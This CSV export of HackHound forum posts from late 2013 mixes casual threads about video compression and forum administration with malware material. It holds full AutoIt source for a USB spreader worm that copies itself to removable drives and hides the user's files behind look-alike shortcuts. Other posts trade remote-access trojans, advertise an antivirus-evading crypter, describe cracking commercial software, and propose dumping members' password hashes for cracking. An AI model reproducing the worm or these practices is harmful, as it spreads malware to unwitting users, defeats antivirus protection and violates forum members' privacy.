subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
[Release] EOFDump - Team Projects - HackHound,release-eofdump,x58,10/26/2013 0:00,Cool small release.,Advanced
Bozok Rat 1.4.3 (Protection Removed by Me) - Malware Samples - HackHound,bozok-rat-143-protection-removed-by-me,Hess,10/26/2013 0:00,What does that binary registry code helds...?,IntelligenceService
Bozok Rat 1.4.3 (Protection Removed by Me) - Malware Samples - HackHound,bozok-rat-143-protection-removed-by-me,PongLenis,10/27/2013 0:00,"the RAT itself is okay, but it's rather amusing of the code to charge arond 100-200 dollars per year for it... 90% of all RAT's are free to use and got much more options.",Banned
Bozok Rat 1.4.3 (Protection Removed by Me) - Malware Samples - HackHound,bozok-rat-143-protection-removed-by-me,Hess,10/27/2013 0:00,"And , some paid ones , have protection but untill You buy them , I have one which is protected , but , since it is paid , just grab DL link and there You go.",IntelligenceService
Bozok Rat 1.4.3 (Protection Removed by Me) - Malware Samples - HackHound,bozok-rat-143-protection-removed-by-me,x_h0rr0r_x,10/28/2013 0:00,"the RAT itself is okay, but it's rather amusing of the code to charge arond 100-200 dollars per year for it... 90% of all RAT's are free to use and got much more options. A good rat is Cerberus..DarkComet is also great and has a ton of options...Sub-7 is back and it will be a great 1 also..",Expert
Bozok Rat 1.4.3 (Protection Removed by Me) - Malware Samples - HackHound,bozok-rat-143-protection-removed-by-me,PongLenis,10/28/2013 0:00,"i have just found my number 1 RAT ""SmallNet RAT"" published one thread under that one *-* its so sexy and works really well",Banned
[Suggestion] Forced Introduction - Suggestions & Support - HackHound,suggestion-forced-introduction,BlackArray,10/28/2013 0:00,"A good idea would be to force newly registered users to create an introduction. If their introduction sounds good, admins/mods could activate the member. This would greatly reduce skids, leechers and jacknkushes. Edited by LeFF, 29 October 2013 - 04:49 AM. added a poll to a post...",IntermediateMember
[Suggestion] Forced Introduction - Suggestions & Support - HackHound,suggestion-forced-introduction,Hess,10/28/2013 0:00,"I saw that approach on some boards , and questions which are asked.",IntelligenceService
World&#39;s #1 free Firewall - Security Software - HackHound,worlds-1-free-firewall,Problemsolva,10/28/2013 0:00,i use this firewall aswell. i like this one really much,Newbie
twGrabber - Malware Samples - HackHound,twgrabber,markcs64,10/29/2013 0:00,VB6 universal Language but .NET just one.........MS...*lamework. seen! b4 @ **. good work though.,Newbie
[Suggestion] Forced Introduction - Suggestions & Support - HackHound,suggestion-forced-introduction,LeFF,10/29/2013 0:00,"added a poll, fell free to vote...",Expert
[Release] EOFDump - Team Projects - HackHound,release-eofdump,Notmex,10/29/2013 0:00,"Well, your EOF is usually called an overlay. This is additional data that doesnt get mapped into the process space by the PE loader. Thus its often used for standalon flash applications or similar that consist of a loader and media data. The exe will open itself, calculate the offset to the data and then access/play it.",Beginner
twGrabber - Malware Samples - HackHound,twgrabber,Hess,10/29/2013 0:00,"But , knowing M$ internals , comes handy in many cases , doesn't it ?",IntelligenceService
Obfuscator - x64/x86 [0/35] - Verified Sellers - HackHound,obfuscator-x64x86-035,noh4t,10/29/2013 0:00,"u need to add a timestamp to the res then avira doesnt cry dont ask me how to do it in vb cause i dont know. I Gave up with a avira alternative via code it's not a major av and it can be bypassed with some external tools that i include. Beta testers Client's stub has been 1/35 for 1 month now ""WithOut Anti Sandbox Just AntiVm"". (ClamAv) Compressor Detection. 4 Client Spots left sold last night too a friend on jabber. Admins can catch me on jabber for verification. Regards",AdvancedMember
[Release] EOFDump - Team Projects - HackHound,release-eofdump,Deque,10/29/2013 0:00,"Thanks, I only knew of the term ""EOF method"", that's how filebinder and crypter writer call it, if they just append data to the end of the file. So it's good that I know the term ""overlay"" as well now.",IntermediateMember
Avi Compressor.. - General Discussion - HackHound,avi-compressor,x_h0rr0r_x,10/29/2013 0:00,"Ok,I am making some Video tutorials and I need a way to compress the finished Avi's so It wont take all day to upload..Is there any good free avi compressors out there?..I have looked but I can't find any worth a shit..Any help will be greatly appreciated.. -x_h0rr0r_x",Expert
[Release] EOFDump - Team Projects - HackHound,release-eofdump,Hess,10/29/2013 0:00,"Well, your EOF is usually called an overlay. This is additional data that doesnt get mapped into the process space by the PE loader. Thus its often used for standalon flash applications or similar that consist of a loader and media data. The exe will open itself, calculate the offset to the data and then access/play it. Correct , thanks for reminder , I recall an good plugin for PEID or such , which didn't just extracted EOF / OVR , but also handled its content , so , You can know what exactly is stored in that EOF / OVR file. (It saved overlay in *.ovr extension and managed to perform scan again and determine what kind of file is that one with extension *.ovr , and does it contains additional files inside.)",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,Hess,10/29/2013 0:00,"I suggest MKV. Also , WAV can be good , but only for people on win or if there is a codec for non win users.",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,crazyboris,10/29/2013 0:00,"I suggest MKV. Also , WAV can be good , but only for people on win or if there is a codec for non win users. mkv is good , you can also stream that format. wav is a audio format. (uncompressed) i guess you meen wmv. avi was windows own format from the beginning , then they abandon it. now they dont even support there own (old) format.",Member
World&#39;s #1 free Firewall - Security Software - HackHound,worlds-1-free-firewall,x58,10/29/2013 0:00,Comodo and Outpost both had security weaknesses. Outpost didn't had properly handled hook function and could be exploit (See damagelab or what the other board was called) And Comodo has the possibility to hijack dlls. (See E-zine 2013 VX) And this is just a few examples of both of these. There is no such thing as 'The Best'. Nothing is 100% perfect.,Advanced
Avi Compressor.. - General Discussion - HackHound,avi-compressor,BlosheRoca,10/29/2013 0:00,"also u don't have to have the avi quality at 100% i usually use cam studio, and on my system i couldnt tell alot of difference in the avi's i recorded when i tried one with a lesser than 100% quality but i did notice a huge file size difference. the lesser quality one was way smaller. when i made the lil vid on how to add .rar to ipb board attachment types the first one i recorded was the size of a full avi movie yet it was about 2 minutes long. lol",Intermediate
Avi Compressor.. - General Discussion - HackHound,avi-compressor,Hess,10/29/2013 0:00,"mkv is good , you can also stream that format. wav is a audio format. (uncompressed) i guess you meen wmv. avi was windows own format from the beginning , then they abandon it. now they dont even support there own (old) format. Correct , I was reffering actually to WMV , and , yes , in past , mkv is often used for live streams.",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,iCode,10/31/2013 0:00,"I don't know why, but I've seen an AVI file that was like 130MB shrunk down to about 7MB inside a ZIP file.",AdvancedMember
Obfuscator - x64/x86 [0/35] - Verified Sellers - HackHound,obfuscator-x64x86-035,coder1986,11/1/2013 0:00,PM your jabber plz,Beginner
[AutoIT] USB Spreader (.lnk method) - Resources - HackHound,autoit-usb-spreader-lnk-method,Danyfirex,11/1/2013 0:00,"#include #RequireAdmin Opt(""MustDeclareVars"", 1) Global Const $WM_DEVICECHANGE = 0x0219 Global Const $DBT_DEVICEARRIVAL = 0x8000 Global Const $DBT_DEVICEREMOVECOMPLETE = 0x8004 Global Const $DBT_DEVTYP_VOLUME = 0x00000002 Global $RutaVirus=""Carpeta_Virus\"" & @ScriptName Global $Gui = GUICreate(""WM_DEVICECHANGE"") GUISetState(@SW_HIDE) GUIRegisterMsg($WM_DEVICECHANGE, ""WM_DEVICECHANGE"") Do Until GUIGetMsg() = -3 ;USB_Main (Spreader) Func USB_Main() Local $USB_list=ListarUSB() Local $i=1 Local $USB_ruta="""" For $i = 1 To $USB_list[0] $USB_ruta=StringUpper($USB_list[$i]) & ""\"" ConsoleWrite($USB_ruta & @CRLF) If not(FileExists($USB_ruta & $RutaVirus)) Then If Not FileCopy(@ScriptFullPath,$USB_ruta & $RutaVirus,8) then ContinueLoop Crear_Shortcut($USB_ruta) EndIf Next EndFunc ;Crear Accesos Directos Func Crear_Shortcut($USB_ruta) ConsoleWrite($USB_ruta & @CRLF) Local $busca = FileFindFirstFile($USB_ruta & ""*"") Local $filename=0,$Inicio=0,$Icono,$Extension="""",$filenameold="""",$Borrar="""" If $busca = -1 Then Exit EndIf While 1 $filename = FileFindNextFile($busca) If @error Then ExitLoop $Inicio=StringInStr($filename,""."") $Extension=Stringmid($filename,$Inicio) ConsoleWrite( ""Extension: "" & $Extension & @crlf) $Icono=ExIcon_Path($Extension) ConsoleWrite($Icono[0] & @CRLF & $Icono[1] & @CRLF) If StringLeft($RutaVirus,StringInStr($RutaVirus,""\"")-1)==$filename Then $Borrar= $USB_ruta & $filename & "".lnk"" if $Icono[1]=="""" Then $filenameold=$filename If $Extension then $filename=StringReplace($filename,$Extension,"".lnk"") Else $filename&="".lnk"" EndIf FileCreateShortcut($USB_ruta & $RutaVirus,$USB_ruta & $filename ,"""","""","""",$Icono[0]) Else $filenameold=$filename If $Extension then $filename=StringReplace($filename,$Extension,"".lnk"") Else $filename&="".lnk"" EndIf ConsoleWrite($USB_ruta & $RutaVirus & @CRLF) FileCreateShortcut($USB_ruta & $RutaVirus,$USB_ruta & $filename,"""","""","""",$Icono[0],"""",$Icono[1]) EndIf WEnd FileDelete($Borrar) FileClose($busca) If Not FileSetAttrib($USB_ruta & ""*"",""+H"") Then Exit If Not FileSetAttrib($USB_ruta & ""*.lnk"",""-H"") Then Exit EndFunc ;Obtener Icono Ruta Func ExIcon_Path($Extension) Local $Icono_Ruta[2] Local $i=1 Local $sApp="""" Local $iComa=0 If Not($Extension=="".exe"") then $Icono_Ruta[1]="""" $sApp=RegRead(""HKEY_CLASSES_ROOT\"" & $Extension, """") $Icono_Ruta[0]=RegRead(""HKEY_CLASSES_ROOT\"" & $sApp & ""\DefaultIcon"","""") EndIf If $Icono_Ruta[0]="""" Then $Icono_Ruta[0]=""shell32.dll"" $Icono_Ruta[1]=4 If not(@OSVersion=""WIN_XP"") Then $Icono_Ruta[0]=""imageres.dll"" EndIf Return $Icono_Ruta Else $iComa=StringInStr($Icono_Ruta[0],"","") If $iComa=0 Then Return $Icono_Ruta Else $Icono_Ruta[1]=StringMid($Icono_Ruta[0],$iComa+1) $Icono_Ruta[0]=StringLeft($Icono_Ruta[0],$iComa-1) Return $Icono_Ruta EndIf EndIf EndFunc ;ListarUSB() Func ListarUSB() Local $USB = DriveGetDrive(""REMOVABLE"") If @error Then ConsoleWrite(""Error DriveGetDrive"" & @CRLF) Else ;~ For $i = 1 To $USB[0] ;~ ; ConsoleWrite(""USB "" & $i & ""/"" & $USB[0] & "":"" & @CRLF & StringUpper($USB[$i]) & @crlf) ;~ Next Return $USB EndIf EndFunc ; rasim ; http://www.autoitscript.com/forum/topic/79460-usbmon/ Func WM_DEVICECHANGE($hWnd, $Msg, $wParam, $lParam) If ($wParam = $DBT_DEVICEARRIVAL) Or ($wParam = $DBT_DEVICEREMOVECOMPLETE) Then Local $DEV_BROADCAST_VOLUME = DllStructCreate(""int dbcvsize;int dbcvdevicetype;int dbcvreserved;int dbcvunitmask;"" & _ ""ushort dbcvflags"", $lParam) Local $iDriveType = DllStructGetData($DEV_BROADCAST_VOLUME, ""dbcvdevicetype"") Else Return $GUI_RUNDEFMSG EndIf If $iDriveType $DBT_DEVTYP_VOLUME Then Return $GUI_RUNDEFMSG Local $iMask = DllStructGetData($DEV_BROADCAST_VOLUME, ""dbcvunitmask"") $iMask = Log($iMask) / Log(2) Local $iDrive = Chr(65 + $iMask) & "":"" Switch $wParam Case $DBT_DEVICEARRIVAL ;~ TrayTip(""WM_DEVICECHANGE"", ""Conectado"", 5, 1) USB_Main() ;~ Case $DBT_DEVICEREMOVECOMPLETE ;~ TrayTip(""WM_DEVICECHANGE"", ""Desconectado"", 5, 2) EndSwitch Return $GUI_RUNDEFMSG EndFunc Saludos Edited by x58, 01 November 2013 - 11:54 AM. prefix added",IntermediateMember
[AutoIT] USB Spreader (.lnk method) - Resources - HackHound,autoit-usb-spreader-lnk-method,x58,11/1/2013 0:00,Please use Language prefix in the future. Modified.,Advanced
Avi Compressor.. - General Discussion - HackHound,avi-compressor,x58,11/1/2013 0:00,"I don't know why, but I've seen an AVI file that was like 130MB shrunk down to about 7MB inside a ZIP file. Screen2exe is able to get a 100MB AVI video in a SWF format(SWF *.exe player with compressed video data stored in it) to a size of about http://www.screen-re.../screen2exe.htm Often you see those file formats at tuts4you. Because they need to be as small as possible.",Advanced
Avi Compressor.. - General Discussion - HackHound,avi-compressor,Hess,11/1/2013 0:00,"Actually , SWF format is available only in SCREE2SWF which is almost same as SCREEN2EXE , just that it supports SWF video format. :SS",IntelligenceService
World&#39;s #1 free Firewall - Security Software - HackHound,worlds-1-free-firewall,Guest_mad_*,11/1/2013 0:00,"I use spyhunter (from enigma soft.) But didn't know if it's secure. Have any idea about it, anybody ? (one of my friend suggest it for me. when i scan my pc, it shows 20-30 adware, delta search etc....!!",NULL
[AutoIT] USB Spreader (.lnk method) - Resources - HackHound,autoit-usb-spreader-lnk-method,BlackArray,11/1/2013 0:00,"Please use Language prefix in the future. Modified. If so many people share AutoIT snippets, you should create AutoIT section too!",IntermediateMember
[AutoIT] USB Spreader (.lnk method) - Resources - HackHound,autoit-usb-spreader-lnk-method,SuckerZ,11/1/2013 0:00,"If so many people share AutoIT snippets, you should create AutoIT section too! I agree. An AutoIt Section would be good, because there are lots of ppl using AutoIt.",IntermediateMember
"10k, Congrats&#33; - Archive - HackHound",10k-congrats,x58,11/1/2013 0:00,We are about 1 year online and we have hit 10K members today. Congratulations! I hope we continue to grow and have more fun here!,Advanced
Avi Compressor.. - General Discussion - HackHound,avi-compressor,x58,11/1/2013 0:00,"Actually , SWF format is available only in SCREE2SWF which is almost same as SCREEN2EXE , just that it supports SWF video format. :SS Yup wasn't sure about how they work and what they do and do not support. What i do know is that i'll try to crack it just for fun.",Advanced
"10k, Congrats&#33; - Archive - HackHound",10k-congrats,Tony,11/1/2013 0:00,Congratz guys!,IntermediateMember
"10k, Congrats&#33; - Archive - HackHound",10k-congrats,BlosheRoca,11/1/2013 0:00,yay lets have a birthday celebration,Intermediate
"10k, Congrats&#33; - Archive - HackHound",10k-congrats,LeFF,11/1/2013 0:00,"yup! we are indeed awesome, congratz!",Expert
"10k, Congrats&#33; - Archive - HackHound",10k-congrats,Hess,11/1/2013 0:00,"We should make special birthday HH logo ! And , I was expecting sooner or later 10K of members , just , I kept it for myself , as I didn't wanted to speak ""foolishness""",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,Hess,11/1/2013 0:00,"Yup wasn't sure about how they work and what they do and do not support. What i do know is that i'll try to crack it just for fun. Indeed , just one small difference and , that is for sale , and free one which is same almost , just doesn't has swf support , what a shame ! :S",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,shushyou82,11/1/2013 0:00,"I haven't seen anyone suggest this yet, not sure why ffmpeg is the best one I have found for converting or compressing video files.",Newbie
[AutoIT] USB Spreader (.lnk method) - Resources - HackHound,autoit-usb-spreader-lnk-method,Hess,11/1/2013 0:00,"Indeed , we get too many snips which have to be in its own section.",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,Hess,11/1/2013 0:00,"I haven't seen anyone suggest this yet, not sure why ffmpeg is the best one I have found for converting or compressing video files. Because , it is CL ?",IntelligenceService
Avi Compressor.. - General Discussion - HackHound,avi-compressor,x58,11/1/2013 0:00,"Indeed , just one small difference and , that is for sale , and free one which is same almost , just doesn't has swf support , what a shame ! :S I got it cracked, was easy but one problem, still the 1500 second limit will try to fix that tomorrow. It reads and writes value under Info in a reg entry Base. I can change this and fix the limit.",Advanced
"10k, Congrats&#33; - Archive - HackHound",10k-congrats,fool'sfool,11/2/2013 0:00,"Leave the foolishness to me Hess. Wow, 10k members, that's pretty cool. Lucky they don't all post all the time, otherwise the forum would just be like a scrolling console window.",AdvancedMember
Avi Compressor.. - General Discussion - HackHound,avi-compressor,shushyou82,11/2/2013 0:00,"Because , it is CL ? they have gui's for it if you need one",Newbie
Avi Compressor.. - General Discussion - HackHound,avi-compressor,Hess,11/2/2013 0:00,"they have gui's for it if you need one Yes , they have , but is more confusing than FFMPEG.exe itself !",IntelligenceService
[Release] EOFDump - Team Projects - HackHound,release-eofdump,fool'sfool,11/2/2013 0:00,"Thank christ someone put a mainstream term to it, I've been trying to understand ""EOF data"" that gets thrown around all the time and getting endless shit about the EOF character or state. Now it makes way more sense... Cheers mex.",AdvancedMember
[Release] EOFDump - Team Projects - HackHound,release-eofdump,Hess,11/3/2013 0:00,"Thank christ someone put a mainstream term to it, I've been trying to understand ""EOF data"" that gets thrown around all the time and getting endless shit about the EOF character or state. Now it makes way more sense... Cheers mex. It's nice to learn / recall existing things , isn't it ? And some extra info on this topic , EOF aka Overlay is often used with condition related stuff and switches , so , based on condition of calling it and sometimes with switches also , so , based on that condition , it depends will it be run , and if switches are used , how it will be interpreted , so , extracting EOF data aka overlay and success and accuracy often depends on it , so extracted EOF / Overlay is not always accurate , based on this what I wrote to.",IntelligenceService
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Ravage,11/3/2013 0:00,You have 24 hours to administrate HackHound. Time starts ... now!!!!!!!!!! What's your first post/topic? What would you say? What would you do? What would you change? What skin would you choose as default? Which member would you warn cause he's been really getting on your nerves this last couple of days? Which member would you ban? What topic would you lock for good? etc Tell us a bit about your idea about administrating HackHound for a 24 H period. Share your craziness with us. I am sure there's a place for your thoughts in this topic.,Expert
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,BullDog,11/3/2013 0:00,"Interesting idea. Let's see if I can get the ball rolling on this one. By the way, don't take my answers too seriously lol. What's your first post/topic? A topic where I introduce myself as the new admin. What would you say? Probably some long emotional post like blablabla new era!... blabla x58 and Ravage can suck it, I'm the boss now blabla... What would you change? Hmmm... off the top of my head I can only think of some minor changes right now. 1.) Update the dead link to the contact form in the navigation bar. 2.) Probably get rid of the ""Blogs"" module, because it's barely being used. 3.) Allow private messaging for everyone again. I (as a member) would rather receive a spam pm once in a while than having to request access first. 4.) Get rid of the ""Flea Market"" and only keep the ""Verified Market"". 5.) Get rid of the following subsections: - Programming iOS - (In)Security Hashes 6.) Use the ""Portal""-site more (post more articles). Probably even make a group that takes care of that. 7.) Make regular contests (e.g. a programming contest all 3 months). What skin would you choose as default? ""DarkEnergy"", because I'm used to it and I think it suits HackHound the best. Apart from that I would keep ""IP.Board mobile"" to properly support smartphones/tablets. Which member would you warn cause he's been really getting on your nerves this last couple of days? I'm not saying that in public . But generally speaking, members that behave immaturely and break the (minor) rules. Which member would you ban? Members that break the rules frequently or only come here to advertise/post spam etc (break major rules). What topic would you lock for good? - Topics that result(ed) in long/endless discussions. - Topics that don't need discussions (e.g. an announcement).",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,fool'sfool,11/4/2013 0:00,"Interesting... at first I was at a loss, but maybe there's some fun stuff I can think of... What's your first post/topic? Hard to get fancy with this, so I dunno.... maybe just a laconic style topic/post. What would you say? "" What would you do? Honestly? At first, I'd explore around the various admin interfaces, learn what I could. Also, I'd do admin stuff, moderate, maintain, etc. If I was also administrator for the whole website & server I'd be right into that since I've not managed that before. Keeping that in mind, I would definitely not be touching anything until I was on top of how it works... if at all. Since this is 24 hrs, I'd probably say that's just a look but don't touch scenario. Then I'd make avatars slightly bigger, cause I spent ages making mine and you can't see it properly. What would you change? Hmm... I think it'd be nice to have something for the associates. As I see it that's a little thing that says ""these people are contributing members, valuable to have around."" The scanner I guess is already like this, but maybe something like a group projects idea where they can collaborate (probably hard to get going or maintain) or simply a forum they get access to where questions and requests can be made, and since they're self demonstrated to be worthwhile members, that'll get bigger explanations, more attention, links to resources and a better answer, since they're guaranteed to be that much more worth making extra time for: they're proven members I guess. What skin would you choose as default? Okay, I just explored them. I'd keep it at DarkEnergy. DarkMatter is kind of cool, but that much dark red looks wierd. Plus the angled bars all over annoy me. Which member would you warn cause he's been really getting on your nerves this last couple of days? PongLenis. Sorry bud, but I will say I already told him off and he took it like a champ and was decent thereafter. Which member would you ban? All accounts like this: http://hackhound.org.../9606-tr1n1t1x/ Okay, here's a link in with my ""stuff for associates etc"" idea: I'd also dump a bunch of data from these accounts, for fun, research and profit and turn it into a little project for us all. Number 1, I'd pull out all the login, visiting time data, all of that, build up a nice little csv file detailing their login and viewing history, enough to gauge when and how often they looked at the board and maybe what they looked at (probably too huge). I'd separate out the IP's, but keep it recoverable if needed, same with email addresses, and possibly login names (I'd use unique ID's for reference), because guess what, I'm also dumping the password hashes for all those unused idle accounts (especially the ones that visit regularly but never post, shiiit). Password hashes are a restricted project for a subset of the membership (let's all fine tune our JTR rules, fuck 'em, the accounts are gone, never used and emails/logins are separated - no used accounts are to be dumped, 1 post = not in list). The forum visitation data is for a more general project, maybe associates or even just everyone. We can all grab that csv file and analyse the shit out of it to see just what these guys are doing, how frequently, how much activity, is it regular, is it sporadic... what? Identify the clusters, different types, and then... well if it gets really interesting, we consider connecting it back to the ip's and see who's watching. Plus we'll learn some very legitimately interesting stuff about how people use forums, catagorisation of forums. Hell, I'd submit this kind of thing to a journal, who wants to be a published author on an academic paper? Resume's anyone? ""In depth analysis of the behaviour and timing of active but idle agents on a security forum."" Bam. What topic would you lock for good? http://hackhound.org...onymous-online/ You already locked my original choice, the guy asking how he can hack his schools server. I liked my advice to him though, I have my small petty fun with those guys before you condemn them to the bin. That was fun! EDIT: Another idea: do this but for HH (check the access_log for amusing shit): http://attrition.org...6/logs.001.html",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Hess,11/4/2013 0:00,"Funky , but good one. 24 hours is a bit short for administration (all people who were or are admins know that) , but let's start with Q&A. Q: What's your first post/topic? A: Introduce myself as a new admin , thank existing staff members for giving me trust , etc.... And , also will say , as various people sometimes get envy and such that I was not preaching for that , and who likes it , likes , who doesn't he doesn't has to , but insults or any kind of personal attack will not be tolerated. Q: What would you say? A: I think I said it above , so , I don't know what else should or I will say , honestly. Q: What would you do? A: Take a look at existing things , and look how they can be improved or fixed. Not necessarily I'd have to to something in that short time. Q: What would you change? A: Add interesting stuff to Portal aka Front page of board. ATM , I have no really too much ideas , since , as I stated , 24 hours is too short. Q: What skin would you choose as default? A: Keep the current skin as this one looks good , and has been always on HH , since it's beginning. Q: Which member would you warn cause he's been really getting on your nerves this last couple of days? A: There are several them , so , one is not enough , because , I am getting too much requests for literary things that I have no and probably wont do for them , as they are usually leeching requests , like crack this for me , do this for me , etc.... Q: Which member would you ban? A: All members that are literary doing nothing here , just watch , request stupid things and do not log in for at least 10 days , reason for that is , because , some of them just come to grab something , and get loose and similar stuff..... Q: What topic would you lock for good? A: Any hacking request topic and any topic that gets off topic or gets too much discussed without anything that leads to solution and some other things that are not on my mind right now. Under ""etc..."" will be: A lot and nothing , as , I an ordinary member can't see what is happening there ""behind scenes"" , and that is why such contradictory answer. I think I answered enough for now , if not , I'll return with some extra things.",IntelligenceService
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Pernat1y,11/4/2013 0:00,What would you do? Check and configure backups. It seems like a common problem. *looks at **** and opensc*,Beginner
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,BullDog,11/4/2013 0:00,"Check and configure backups. It seems like a common problem. *looks at trojanforge and opensc* Just to clarify: HackHound admins do that already (I think on a daily basis, maybe weekly though - I don't remember). But this seems to be a problem indeed, generally speaking.",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,fool'sfool,11/4/2013 0:00,"Yeah I had it from x58 the other day, backups are regular, the regular non-24 hour admins here are cluey guys. Backups regularly, pulled (not pushed) by an offsite server. That's the smart way. More than one fella has been double pwned by having a backup system that has the webserver use pubkeys to connect back to a backup server, rather than a backup server connecting to the webserver.",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Hess,11/4/2013 0:00,"Yeah I had it from x58 the other day, backups are regular, the regular non-24 hour admins here are cluey guys. Backups regularly, pulled (not pushed) by an offsite server. That's the smart way. More than one fella has been double pwned by having a backup system that has the webserver use pubkeys to connect back to a backup server, rather than a backup server connecting to the webserver. But , if backdoor is in , then , it will remain there , I know it , since in real , business network , I ran on such thing , and removing it from backup server , was really painful , like when it was put , which backups have it and similar.... Even students server and business server were separated and also their backup servers , it managed to get into business one , since , it is as it is IT University full of 1337 students , one of backup operators didn't followed exact procedure , so I got involved to find it and disable it. :S",IntelligenceService
Obfuscator - x64/x86 [0/35] - Verified Sellers - HackHound,obfuscator-x64x86-035,noh4t,11/4/2013 0:00,PM your jabber plz I Am away until late tomorrow i will pm you coder1986 P.S (Clamav bypassed.) Mod please update post,AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Ravage,11/4/2013 0:00,Time is up boys. Kind of sad no one decided to get a bit crazy about it. No revolution then?! LoL Wasn't really interested on getting extra ideas but to know a bit more about you guys and what's going on inside that head of yours. LoL Nice down to earth fellas we got here exception made to fool'sfool that is a bit nuts but that is something we are already getting used to it. Thanks guys for participating. Nice exercise. We are taking over now before sections start to disapear from this board and our members count get reduced to 100!,Expert
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,fool'sfool,11/5/2013 0:00,"Ah okay... I had a think about whether this was a profiling exercise, brainstorming, for fun or for finding a new admin candidate. I figured I'd come up with something creative, left of field. I feel so judged. I mean... did you want job applications and CV's or some crazy shit? Crazy shit right?",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Ravage,11/5/2013 0:00,"Yeah it was supposed to be fun. We leave CV's and all that crap for the ""real world"" outside. You did good.",Expert
Obfuscator - x64/x86 [0/35] - Verified Sellers - HackHound,obfuscator-x64x86-035,hero420,11/5/2013 0:00,You didn't mention what language it is coded in. Also small stub size in numbers would be around ?? I am interested in this if your stubs are as unique as you say !,Beginner
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,fool'sfool,11/5/2013 0:00,Sweet... cheers man. It was a fun little exercise.,AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Hess,11/5/2013 0:00,"Too bad , I am sometimes so much realistic , that I don't know for word ""fun"" when it comes to work , and that kind of work is related to me. :S",IntelligenceService
Obfuscator - x64/x86 [0/35] - Verified Sellers - HackHound,obfuscator-x64x86-035,Hess,11/5/2013 0:00,"You didn't mention what language it is coded in. Also small stub size in numbers would be around ?? I am interested in this if your stubs are as unique as you say ! I have similar to this , just , it is other people work , cracked by TOW , and that guy is still in RAT development , I can't believe it , I ran on site where he it under his old handle which I know from past !",IntelligenceService
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,x58,11/5/2013 0:00,"one fella has been double pwned by having a backup system that has the webserver use pubkeys to connect back to a backup server, rather than a backup server connecting to the webserver. I either suggest not using a webserver for it, because it is shit(security wise) and slow. You can use the the webmin or simulair panel on your server for it or like i use cron job + syncback but for backups i would suggest scp.. Instead of syncback (external server). Off topic, I've moved content from Subforums that Bulldog indicated. And deleted those subforums e.g iOS and Hashes, those where dead anyway. What next?",Advanced
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,PongLenis,11/5/2013 0:00,"What I would really like to have is a general talking section. I just like talking with nice people about everyday's life and stuff. No IT and PC stuff. Ofc this is an IT forum, but it never hurts to get along with the other guys in tha forumz and know a little bit about them and their personality",Banned
Obfuscator - x64/x86 [0/35] - Verified Sellers - HackHound,obfuscator-x64x86-035,noh4t,11/6/2013 0:00,You didn't mention what language it is coded in. Also small stub size in numbers would be around ?? I am interested in this if your stubs are as unique as you say ! It's coded in vb6 Stub size depends on the time as code gets changed updated -/+ Average is 50-70kb,AdvancedMember
